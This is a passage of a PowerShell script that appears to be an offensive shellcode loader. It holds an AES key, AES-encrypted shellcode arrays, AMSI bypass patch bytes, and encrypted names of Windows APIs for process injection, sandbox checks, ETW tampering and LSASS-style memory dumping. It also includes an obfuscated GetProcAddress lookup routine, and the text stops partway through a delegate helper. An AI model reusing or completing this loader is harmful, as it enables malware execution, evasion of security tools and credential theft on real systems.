### Encrypted data
[Byte[]] $AesKey = 0x30, 0xA9, 0xB5, 0xBA, 0x18, 0x9F, 0x1C, 0xD2, 0x58, 0x51, 0xA6, 0xA2, 0xDE, 0xD1, 0xC5, 0x39, 0x57, 0xE6, 0xD6, 0x0C, 0x8C, 0x13, 0x35, 0x82, 0x6F, 0x18, 0x27, 0x69, 0xBF, 0xE3, 0x81, 0x31
[Byte[]] $AesIV = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D
[Byte[]] $buf = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0xCE, 0xAD, 0x75, 0x3D, 0xB4, 0xA1, 0x86, 0x20, 0x86, 0x8B, 0x9E, 0x67, 0x86, 0x32, 0xAC, 0x9C, 0xB4, 0x77, 0x04, 0x10, 0x4F, 0xE6, 0x25, 0xC2, 0x33, 0xAF, 0xDA, 0xA8, 0x8B, 0x4C, 0x73, 0xAE, 0x0C, 0x50, 0x07, 0xBA, 0xC7, 0x73, 0xEB, 0x66, 0xD2, 0x79, 0xEC, 0xAA, 0xA3, 0xFB, 0xC0, 0x1E, 0xA1, 0xE2, 0x23, 0xA3, 0x62, 0xDF, 0xA4, 0xEA, 0x23, 0xCB, 0x86, 0x3F, 0x94, 0xEE, 0x53, 0xED, 0xA8, 0x1C, 0xFB, 0xDC, 0xC5, 0xEE, 0xBD, 0x40, 0xA1, 0x59, 0x7D, 0x01, 0xF8, 0x60, 0x5E, 0x5C, 0x6C, 0xDC, 0x61, 0x6F, 0x42, 0x80, 0x2F, 0x14, 0xD1, 0x3C, 0x03, 0xED, 0x2D, 0x8E, 0x68, 0x59, 0x9D, 0x1C, 0x21, 0xCE, 0xF2, 0x02, 0xA8, 0x1D, 0xC6, 0x5B, 0xA6, 0x1E, 0x20, 0x86, 0x3F, 0xEE, 0xA0, 0x8F, 0xAE, 0xC1, 0x05, 0x92, 0x8D, 0x9D, 0x89, 0xD7, 0x44, 0x53, 0x6D, 0x77, 0x92, 0x24, 0x6A, 0x14, 0x30, 0x61, 0x86, 0xBB, 0x4B, 0x4F, 0xF7, 0x6D, 0xDD, 0xA0, 0x1E, 0x10, 0x2A, 0xD9, 0x50, 0x70, 0x8F, 0x49, 0xFF, 0x39, 0x38, 0xE3, 0x3B, 0x0A, 0x23, 0x43, 0x19, 0xF0, 0x0C, 0xA2, 0x00, 0x46, 0xC0, 0xB3, 0x9D, 0x04, 0xDD, 0xFC, 0x4A, 0x86, 0x7A, 0x65, 0x81, 0xF7, 0x6B, 0xFF, 0x03, 0x40, 0xCB, 0x13, 0xC2, 0x47, 0x3C, 0x67, 0x71, 0x35, 0x00, 0xBD, 0x83, 0x34, 0x3C, 0xC0, 0xBC, 0xB4, 0xF1, 0x05, 0xC7, 0x43, 0x7F, 0xF5, 0xE7, 0xF3, 0x40, 0xFA, 0x66, 0xE7, 0xD2, 0xED, 0xB1, 0xCD, 0x0A, 0x01, 0x74, 0x77, 0x28, 0xA5, 0x95, 0xE3, 0x9D, 0x4D, 0x00, 0x70, 0x72, 0x78, 0x49, 0x45, 0xE2, 0xD2, 0x5C, 0x87, 0x4F, 0x53, 0xD4, 0xD5, 0x71, 0x87, 0x20, 0x13, 0xFB, 0xC6, 0xB7, 0x94, 0x0A, 0x78, 0x49, 0xEF, 0xC9, 0x0E, 0x94, 0xB8, 0x60, 0x7A, 0x8B, 0x91, 0xCF, 0x6E, 0x3C, 0x4E, 0xD5, 0xC3, 0x58, 0xFD, 0x79, 0x92, 0x1D, 0x7B, 0xA6, 0xAA, 0xE9, 0xF6, 0xBF, 0xBC, 0xC0, 0xCE, 0x89, 0x1B, 0xC1, 0x61, 0xFF, 0xCF, 0x41, 0xBB, 0x0F, 0x48, 0x47, 0xF6, 0x42, 0x0A, 0x0C, 0xA3, 0x4E, 0x95, 0x89, 0x48, 0xB3, 0x03, 0xFF, 0xE7, 0x7E, 0xBC, 0xF7, 0x8F, 0x89, 0xB2, 0x78, 0xB5, 0x4C, 0xF7, 0x41, 0xBF, 0xDC, 0xFA, 0x24, 0x43, 0x8E, 0x09, 0x98, 0x8D, 0x79, 0x18, 0xFD, 0x7D, 0x56, 0xBB, 0xEB, 0xD2, 0xF3, 0x50, 0xA5, 0x26, 0x46, 0xC0, 0x6F, 0xB8, 0x2D, 0x82, 0x9D, 0x67, 0x89, 0xBF, 0x71, 0xBB, 0x36, 0xBE, 0x53, 0x8C, 0x69, 0x15, 0x1B, 0xF6, 0x77, 0x8C, 0x56, 0xA2, 0xFB, 0x71, 0xD2, 0x9F, 0xB6, 0x66, 0xC2, 0x96, 0xAD, 0x03, 0x82, 0xFD, 0x70, 0x46, 0x96, 0xC7, 0x56, 0x5A, 0xCE, 0x4F, 0x28, 0x46, 0x93, 0x5C, 0xEF, 0x56, 0x27, 0x7D, 0xBC, 0x90, 0xB1, 0xFA, 0x57, 0x94, 0x3C, 0x77, 0x5F, 0xD1, 0x53, 0x85, 0xF5, 0x4C, 0xC7, 0xC8, 0x5A, 0x0E, 0xF7, 0x34, 0x9E, 0x91, 0x69, 0x82, 0x24, 0x12, 0xD0, 0xD2, 0x75, 0xBE, 0xCE, 0x4B, 0x14, 0xAD, 0x13, 0xAC, 0x20, 0x47, 0xD0, 0x92, 0x28, 0xD7, 0x4C, 0x84, 0xCE, 0x94, 0xCA, 0x0F, 0x69, 0x91, 0x48, 0xCA, 0x67, 0x48, 0x14, 0x77, 0xBE, 0x6D, 0xA5, 0xDD, 0x72, 0x26, 0x31, 0x2F, 0xFE, 0x99, 0x08, 0x8D, 0x86, 0x8C, 0xBF, 0x82, 0x02, 0xF2, 0xD7, 0x4F, 0x94, 0x1A, 0xAA, 0x7B, 0xC2, 0x13, 0x43, 0x79, 0xF6, 0xA7, 0xDF, 0x54, 0x3B, 0xB8, 0x63, 0x0F, 0x32, 0x12, 0x64, 0xD5, 0x6E, 0xEC, 0x1B, 0x56, 0x6A, 0xBD, 0xAE, 0x35, 0x76, 0xC3, 0x50, 0x2A, 0x87, 0x06, 0x03, 0x95, 0x72, 0xAA, 0xBA, 0x0F, 0x47, 0x69, 0xF8, 0xDD, 0x7B, 0x23, 0x6D, 0x62, 0x85, 0xB1, 0x2A, 0xCA, 0x9E, 0x22, 0x38, 0xDB, 0xBA, 0xD3, 0xB0, 0xDF, 0xC9, 0x25, 0xD0, 0x1D, 0xFD, 0x51, 0x74, 0xA8, 0xCF, 0x26, 0x4A, 0x6F, 0x76, 0xE4, 0x89, 0x61, 0x0A, 0xBF, 0x98, 0x18, 0xF9, 0x94, 0xEA, 0x62, 0x38, 0xB5, 0xCB, 0x32, 0x4F, 0x41, 0x76, 0x68, 0xAE, 0xE5, 0x46, 0x67, 0x30, 0x53, 0x63, 0x3A, 0x8A, 0xC6, 0xD5, 0xFE, 0xF2, 0x6D, 0x5A, 0x15, 0x6C, 0xEF, 0xC5, 0x72, 0xCF, 0x24, 0x25, 0x43, 0xBB, 0x9E, 0x91, 0xC2, 0xA1, 0xAB, 0xEA, 0x2D, 0xA2, 0x4C, 0xA1, 0x6A, 0x00, 0x68, 0x44, 0xD0, 0xF1, 0x23, 0x79, 0x74, 0x55, 0x45, 0x39, 0x27, 0x1D, 0x54, 0xE4, 0x38, 0x4E, 0xBC, 0x7C, 0x48, 0x28, 0x09, 0x40, 0x4A, 0xDE, 0x72, 0x63, 0x6E, 0x55, 0xFB, 0x13, 0xEC, 0x56, 0x47, 0xA2, 0xE5, 0x86, 0x7E, 0x93, 0x36, 0xCA, 0xF4, 0xDB, 0x30, 0x55, 0x44, 0xE0, 0x97, 0x63, 0xFB, 0x62, 0xE5, 0xF8, 0x4B, 0xFB, 0x4C, 0x7D, 0x11, 0x2E, 0x45, 0x9D, 0x1C, 0xCC, 0x43, 0x52, 0x3F, 0x02, 0xE4, 0x6B, 0xD6, 0xE9, 0x0D, 0xEB, 0x2F, 0x43, 0xF8, 0x78, 0xD8, 0x82, 0x68, 0x3E, 0x84, 0x63, 0x57, 0xE4, 0x85, 0xCC, 0x80, 0xFC, 0x0D, 0xF8, 0x1C, 0x97, 0xB6, 0x84, 0x14, 0xA5, 0xBF, 0x89, 0x86, 0xEF, 0x7D, 0x53, 0x11, 0x2D, 0x1B, 0xA2, 0x53, 0x55, 0x9B, 0xA5, 0x27, 0x33, 0x7F, 0x46, 0xD2, 0x22, 0x62, 0x20, 0xBB, 0x06, 0xD6, 0x6C, 0x44, 0xB9, 0x07, 0x0C, 0xA5, 0x72, 0xAA, 0x65, 0x1B, 0xB7, 0x56, 0xB6, 0xCE, 0x34, 0x24, 0x82, 0x15, 0x2C, 0xE6, 0xE7, 0x0B, 0x0C, 0x94, 0x68, 0xF9, 0x5E, 0x55, 0xFB, 0x45, 0x8A, 0x89, 0xCE, 0x67, 0x3F, 0x57, 0x60, 0xDB, 0x5D, 0x54, 0x3D, 0x50, 0x07, 0xBE, 0x48, 0x48, 0x80, 0x67, 0x94, 0x14, 0x79, 0xB5, 0xDF, 0x7D, 0xC0, 0x04, 0x82, 0x17, 0x50, 0xF4, 0xDB, 0xA9, 0x21, 0x2B, 0xB5, 0x2B, 0x82, 0xC1, 0x73, 0xBE, 0x20, 0x90, 0xF5, 0x29, 0xD0, 0x0F, 0x79, 0xBF, 0x37, 0x15, 0x46, 0x2F, 0x6E, 0xC7, 0x69, 0x5E, 0x36, 0x74, 0xE8, 0x6D, 0x49, 0x92
[Byte[]] $buf86 = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x7B, 0x4D, 0xB4, 0xD7, 0xD9, 0x00, 0x4A, 0x7B, 0x26, 0xB7, 0xBA, 0xA7, 0xF7, 0x00, 0x7B, 0x29, 0xEE, 0x73, 0x70, 0xAE, 0x95, 0xC5, 0x67, 0x2F, 0xF5, 0x46, 0xB5, 0x8C, 0x2D, 0x9E, 0xA1, 0x4E, 0x80, 0x0E, 0x12, 0x0C, 0xE6, 0xA0, 0x95, 0xEF, 0x96, 0xF5, 0x18, 0xF0, 0x61, 0xF0, 0xF2, 0x80, 0x72, 0xD1, 0xA2, 0x07, 0x79, 0x8D, 0xCF, 0xCB, 0xE4, 0xE4, 0x63, 0xCD, 0x08, 0x53, 0x3F, 0x16, 0x02, 0xB6, 0x2D, 0x7F, 0x6D, 0xC3, 0x90, 0xC7, 0xB5, 0xB4, 0xEE, 0x35, 0x30, 0xD5, 0xEF, 0xCA, 0xF8, 0x89, 0x85, 0x16, 0x2B, 0x09, 0x4D, 0x13, 0xC3, 0x7D, 0x15, 0xC8, 0x1E, 0x70, 0x7B, 0xB5, 0x93, 0x47, 0x54, 0x3D, 0x49, 0x0D, 0x45, 0xE9, 0x74, 0x58, 0xB1, 0x93, 0x7B, 0x96, 0xD6, 0xC4, 0x54, 0xF4, 0xB4, 0xA1, 0x66, 0x8A, 0x04, 0x9F, 0xA2, 0x03, 0xAD, 0xC8, 0xD9, 0x4F, 0x81, 0xE3, 0x5B, 0x9D, 0x9F, 0xCC, 0xC2, 0x63, 0x76, 0x44, 0x8D, 0x2F, 0x8E, 0xEA, 0x27, 0xEC, 0x11, 0xA6, 0x13, 0xCD, 0xC8, 0x3D, 0x2A, 0x22, 0x62, 0x96, 0x75, 0xE7, 0x37, 0x2C, 0xAC, 0xA6, 0xDA, 0x81, 0x58, 0xDD, 0x65, 0xB4, 0xC1, 0xD6, 0x1B, 0xF0, 0x46, 0xE8, 0x3D, 0xEF, 0xC3, 0xE0, 0x3B, 0x8A, 0xA5, 0xBA, 0x5C, 0x49, 0x12, 0xEB, 0xA8, 0xF3, 0xE3, 0xFE, 0x33, 0xB1, 0x3B, 0xD5, 0x6F, 0x26, 0x4C, 0x14, 0xCF, 0xDD, 0x7F, 0xF8, 0xA0, 0x7F, 0x32, 0xFB, 0xD0, 0x90, 0xA6, 0x94, 0x7E, 0x21, 0x5C, 0x9E, 0xE5, 0x24, 0x20, 0xF9, 0xDE, 0x80, 0x76, 0x04, 0x49, 0x1D, 0x71, 0x9E, 0xD4, 0xB5, 0x16, 0x75, 0x65, 0x51, 0x32, 0x73, 0xFF, 0xF3, 0xB1, 0xCC, 0xF8, 0xBC, 0x1E, 0xB0, 0xDB, 0x33, 0x08, 0x5B, 0x1E, 0xE7, 0xFF, 0xEA, 0xF5, 0x9C, 0x24, 0x39, 0x1E, 0x0F, 0x7D, 0x58, 0xF4, 0xD9, 0x10, 0xF7, 0xC6, 0xA4, 0xA8, 0xC7, 0xB1, 0xAC, 0x76, 0x6B, 0x8C, 0x1F, 0x98, 0x02, 0xCB, 0xA2, 0xA5, 0xBD, 0xBD, 0xDD, 0x0B, 0xF0, 0x09, 0xD1, 0x9E, 0xB7, 0x8C, 0xEF, 0xC8, 0x3D, 0xFB, 0x05, 0x4C, 0xBC, 0x49, 0x26, 0xF0, 0xF8, 0xC3, 0xAE, 0xEF, 0xAB, 0x61, 0x88, 0xC4, 0x4B, 0x6B, 0xBC, 0xB5, 0x28, 0x54, 0x95, 0x3B, 0x63, 0x58, 0x13, 0x38, 0x0F, 0x68, 0xCC, 0x7D, 0xE5, 0x2B, 0x20, 0xB8, 0x2F, 0x2E, 0x21, 0x01, 0x62, 0x1C, 0xA6, 0xA4, 0xD8, 0x5F, 0xC1, 0xB5, 0x04, 0xE5, 0xE6, 0xB8, 0xBB, 0x77, 0x27, 0x0B, 0x13, 0x62, 0x40, 0x03, 0xCA, 0x58, 0xB5, 0x41, 0x7F, 0x89, 0x0A, 0xC0, 0x0D, 0x8C, 0x08, 0x65, 0x97, 0xE7, 0x15, 0x00, 0x69, 0xFE, 0x31, 0xE4, 0x06, 0x03, 0xB9, 0x31, 0x6A, 0xBF, 0xA6, 0xE6, 0x44, 0x67, 0xAE, 0xAE, 0x2E, 0x8C, 0x24, 0x3E, 0x8F, 0xC6, 0x41, 0xA0, 0x6D, 0xE0, 0x3A, 0xAB, 0x26, 0xF1, 0x29, 0x53, 0xEB, 0xF1, 0x69, 0x96, 0x6E, 0x6E, 0x16, 0xA0, 0xFE, 0x1D, 0x5E, 0x76, 0x86, 0xFB, 0x20, 0x63, 0xEA, 0xB7, 0xD3, 0xCE, 0x20, 0xF6, 0x46, 0x3C, 0x72, 0xF9, 0xC3, 0xD6, 0x39, 0x14, 0xDF, 0x30, 0x75, 0x39, 0xB6, 0x28, 0x3A, 0x36, 0xB8, 0x67, 0x9B, 0x61, 0x00, 0x5F, 0x26, 0x02, 0xD1, 0x39, 0xE8, 0xFF, 0x71, 0x98, 0x2B, 0xE4, 0x6E, 0x64, 0xFB, 0x88, 0xA4, 0x0E, 0x45, 0x9F, 0xEB, 0x9D, 0xB1, 0x98, 0xA0, 0x0D, 0x2A, 0xBA, 0x42, 0xB7, 0xA0, 0x24, 0x22, 0x70, 0xB8, 0xF0, 0x26, 0x6E, 0x7C, 0xD7, 0x3C, 0x63, 0x82, 0x65, 0xFA, 0x77, 0x0C, 0x79, 0x7B, 0x70, 0x6B, 0x8C, 0x94, 0x51, 0xFD, 0x63, 0x81, 0xE9, 0x80, 0xF5, 0x92, 0x91, 0x56, 0xDD, 0xDF, 0xE0, 0x50, 0xC8, 0x10, 0xD0, 0x59, 0xF0, 0x13, 0xF0, 0xB3, 0x0A, 0x58, 0xFE, 0x66, 0x0F, 0xAB, 0x29, 0x5C, 0xB3, 0xE1, 0x11, 0x5F, 0x50, 0x2F, 0x86, 0xD4, 0xA8, 0x72, 0xB6, 0xE7, 0x82, 0xD8, 0xF4, 0x6C, 0x3F, 0x7C, 0xAD, 0x64, 0xAB, 0xDB, 0xE1, 0x2F, 0xA0, 0xF2, 0xDB, 0x6D, 0xD9, 0x1A, 0x41, 0x17, 0x27, 0xBD, 0x55, 0x71, 0xA8, 0x74, 0xBF, 0x71, 0x5C, 0x25, 0x93, 0x6A, 0xBC, 0xF2, 0x54, 0x80, 0xFA, 0x3A, 0xB5, 0x27, 0xD4, 0xCE, 0x49, 0x25, 0xCA, 0x39, 0x90, 0xF4, 0x8C, 0x1B, 0x97, 0xBC, 0xD9, 0xC5, 0xC4, 0x4E, 0xEC, 0x8A, 0xFB, 0xD8, 0xBB, 0x9E, 0x6B, 0xBC, 0x8F, 0x1D, 0xA5, 0x33, 0xB8, 0x61, 0xA1, 0x7D, 0x0F, 0xE4, 0xC1, 0xE5, 0x8B, 0x56, 0xC5, 0xE9, 0x60, 0x72, 0xA2, 0xB1, 0x29, 0xD6, 0x3A, 0xE4, 0xFB, 0x5E, 0x52, 0xA9, 0x58, 0x6A, 0xC3, 0xD2, 0xCE, 0x14, 0x58, 0xF3, 0x66, 0x7C, 0x30, 0xF5, 0x7F, 0xB6, 0x63, 0x08, 0xB3, 0x13, 0xE5, 0x38, 0x77, 0x44, 0x11, 0xA3, 0x31, 0xB4, 0x37, 0xA6, 0xA3, 0x0C, 0x54, 0x98, 0x9A, 0xA7, 0x5A, 0x76, 0x49, 0x33, 0x59, 0xD4, 0xBB, 0x55, 0x91, 0x84, 0x42, 0xEC, 0xEE, 0xBF, 0x69, 0x5B, 0xC0, 0xEF, 0xD9, 0x9B, 0x67, 0x11, 0xEE, 0xE5, 0x52, 0x9D, 0x12, 0x7E, 0x60, 0x0D, 0x9F, 0xF4, 0x83, 0x58, 0xD8, 0x1D, 0x34, 0x02, 0x62, 0x13, 0x12, 0x06, 0x9A, 0x6A, 0xB6, 0x14, 0x72, 0x12, 0x32, 0x09, 0x30, 0x38, 0xF4, 0x07, 0x1B, 0x7B, 0xAF, 0xFC, 0xF3, 0x86, 0x32, 0x9D, 0x2F, 0x7E, 0x4B, 0x10, 0x6C, 0x84, 0x38, 0xDC, 0xB7, 0x23, 0x0A, 0xFA, 0x01, 0xB2, 0x97, 0x30, 0xD8, 0x9A, 0x6E, 0x7C, 0xDB, 0xA7, 0x1D, 0xF6, 0xF3, 0x98, 0x08, 0x4F, 0xDB, 0xF8, 0xB2, 0xB0, 0xD9, 0xB8
[Byte[]] $AmsiPatch = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x12, 0x54, 0x3E, 0xA2, 0xAC, 0x26, 0x15, 0x30, 0xC9, 0x5A, 0x21, 0xD1, 0x3E, 0xB6, 0x20, 0x1B
[Byte[]] $AmsiPatch86 = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0xDD, 0xAF, 0x71, 0xCA, 0xC8, 0xDA, 0x5E, 0xDC, 0xFF, 0x25, 0x5D, 0x57, 0xA4, 0xEE, 0x25, 0x0D
[Byte[]] $VirtualAlloc_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0xC9, 0xFB, 0xC8, 0x99, 0x40, 0x42, 0x62, 0x14, 0x37, 0xAB, 0x32, 0xB2, 0x88, 0xD8, 0x9D, 0xCB
[Byte[]] $VirtualProtect_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x9A, 0x30, 0x39, 0x7B, 0xEE, 0xC7, 0x6A, 0xD3, 0xC7, 0xEC, 0x81, 0xD6, 0xC9, 0x34, 0xC8, 0xA5
[Byte[]] $CreateThread_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0xB8, 0xE7, 0x57, 0xB5, 0x81, 0xDB, 0xCF, 0x9A, 0x96, 0xBF, 0xAB, 0x71, 0x93, 0x31, 0x4C, 0x01
[Byte[]] $WaitForSingleObject_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x94, 0xAA, 0xE9, 0x57, 0xFB, 0x93, 0x6D, 0x86, 0x26, 0xCC, 0x74, 0xDE, 0xEE, 0xE5, 0x93, 0xD4, 0xC2, 0xB2, 0x54, 0x57, 0x90, 0x87, 0xA0, 0x16, 0xCA, 0xB7, 0x99, 0x9A, 0xC6, 0x6A, 0xC1, 0x32
[Byte[]] $VirtualAllocEx_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x14, 0x89, 0x61, 0x67, 0x40, 0xFE, 0x4F, 0x71, 0xD1, 0xA9, 0x1B, 0xC8, 0x95, 0xE1, 0x02, 0x90
[Byte[]] $WriteProcessMemory_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x3D, 0xEF, 0x6C, 0x25, 0x29, 0x5F, 0xA1, 0x7F, 0xEC, 0x3B, 0x22, 0x5D, 0x08, 0xE8, 0xEB, 0x75, 0xAD, 0x25, 0x95, 0xE3, 0x6C, 0x02, 0x6E, 0x91, 0x17, 0xEC, 0xBA, 0x2C, 0xAC, 0xE3, 0xD4, 0x4A
[Byte[]] $CreateRemoteThread_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x8F, 0x08, 0xFE, 0xC2, 0xD5, 0xF0, 0xB3, 0x2B, 0x29, 0x4B, 0x20, 0xCF, 0x83, 0x02, 0x51, 0x65, 0x19, 0x0E, 0x55, 0xBA, 0x38, 0x92, 0x66, 0x65, 0xD8, 0x76, 0x60, 0x46, 0x53, 0x52, 0x21, 0x0B
[Byte[]] $OpenProcess_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0xFB, 0xDD, 0x0B, 0x88, 0x7F, 0xDD, 0x6B, 0xE3, 0xDF, 0x63, 0x44, 0xB4, 0xF5, 0xD2, 0xFC, 0xC2
[Byte[]] $GetCurrentProcess_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0xE3, 0x1B, 0x5D, 0xB1, 0xED, 0xE0, 0x56, 0x0E, 0x21, 0x7D, 0x73, 0x77, 0x4A, 0x8D, 0x29, 0x17, 0x2A, 0x5E, 0x86, 0xE9, 0xF4, 0x7D, 0x7A, 0x73, 0xAA, 0x47, 0x43, 0x92, 0x00, 0xA6, 0xFA, 0xB4
[Byte[]] $FlsAlloc_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x4E, 0xFD, 0xD8, 0x8E, 0x96, 0x18, 0x6E, 0x0C, 0x6E, 0x11, 0xA0, 0x7F, 0x55, 0x7D, 0x55, 0x53
[Byte[]] $VirtualAllocExNuma_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x42, 0x93, 0x71, 0xD9, 0xD5, 0xD8, 0xB3, 0x27, 0xC1, 0x79, 0x9E, 0xF7, 0x04, 0x2B, 0xF5, 0x50, 0xBC, 0x70, 0x0E, 0x73, 0xB5, 0xA0, 0x4E, 0xAF, 0xA7, 0x98, 0x1F, 0xC2, 0x5B, 0x31, 0xFA, 0x48
[Byte[]] $CreateProcessA_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0xD2, 0x95, 0x8B, 0x54, 0x55, 0x69, 0xBB, 0x61, 0xE2, 0x63, 0xB2, 0x4F, 0x3D, 0x4D, 0xAD, 0x7F
[Byte[]] $ZwQueryInformationProcess_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x88, 0xAF, 0xC1, 0xCA, 0x50, 0x38, 0x38, 0xD4, 0x5E, 0x39, 0xDB, 0x0D, 0xC3, 0xE3, 0x7C, 0x8F, 0xEE, 0x6D, 0x6C, 0x3B, 0xBD, 0x47, 0xE5, 0xA6, 0x62, 0x69, 0xC0, 0x63, 0x44, 0x3C, 0x4F, 0x27
[Byte[]] $ReadProcessMemory_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0xC5, 0xCE, 0x02, 0xC7, 0x1E, 0x68, 0x38, 0xBD, 0xCF, 0x12, 0xBC, 0xDB, 0x43, 0xF2, 0x5F, 0x5C, 0x5D, 0x1C, 0x06, 0x93, 0x3C, 0xF4, 0x29, 0x0E, 0xF7, 0xEB, 0x52, 0x69, 0xF4, 0xB8, 0x13, 0x7B
[Byte[]] $ResumeThread_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x8B, 0xBC, 0x89, 0x98, 0x89, 0x2D, 0x6B, 0xFD, 0x47, 0xD2, 0xA9, 0x21, 0x05, 0xCD, 0x83, 0x4F
[Byte[]] $LoadLibraryA_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x8D, 0xE0, 0x80, 0x2F, 0xE7, 0x2B, 0xAC, 0xD1, 0xCB, 0xD0, 0x0F, 0xC6, 0x5B, 0x99, 0x03, 0x6F
[Byte[]] $GetStdHandle_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x15, 0x8B, 0x77, 0x4C, 0x81, 0x74, 0x44, 0x73, 0xB0, 0x6F, 0x60, 0x24, 0x7C, 0x1D, 0xE4, 0x03
[Byte[]] $MiniDumpWriteDump_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0xD6, 0xA7, 0xA6, 0x94, 0x4F, 0xC8, 0x2D, 0x51, 0x40, 0xDF, 0x60, 0x03, 0x63, 0x14, 0x0B, 0x9B, 0xCD, 0xD1, 0x52, 0xB5, 0x8A, 0x8F, 0xBE, 0x5B, 0xF5, 0x5E, 0x44, 0xB7, 0xA3, 0xD0, 0x67, 0x82
[Byte[]] $amsidll_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0xFF, 0x29, 0x3E, 0xB3, 0x52, 0x72, 0x7F, 0xC6, 0x39, 0x44, 0x1D, 0xCB, 0x5D, 0xBD, 0x6C, 0x9A
[Byte[]] $NtTraceEvent_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x47, 0x84, 0x0F, 0x45, 0x11, 0x74, 0x71, 0xCC, 0x82, 0xBC, 0xDF, 0x41, 0x14, 0x37, 0x1F, 0x6F
[Byte[]] $AmsiSb_Bytes = 0x9D, 0xB2, 0x9F, 0xF4, 0xFE, 0x9D, 0xCC, 0xCC, 0x49, 0x13, 0xFF, 0xBE, 0x22, 0xE3, 0xA4, 0x3D, 0x55, 0x30, 0x51, 0x66, 0xB5, 0x9E, 0x85, 0x56, 0x63, 0x8F, 0x50, 0xFC, 0x3C, 0xB9, 0xA9, 0xF0

function LookupFunc()
{
	Param ($moduleName, $functionName)
	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$tmp = @()
	$assem.GetMethods() | ForEach-Object { If ($_.Name -like "Ge*P*oc*ddress") { $tmp += $_ } }
	
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,@($moduleName)), $functionName))
}

function getDelegateType()
{
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]]
		$func, [Parameter(Position = 1)] [Type] $delType = [Void]
	)
	$type = [AppDomain]::CurrentDomain.
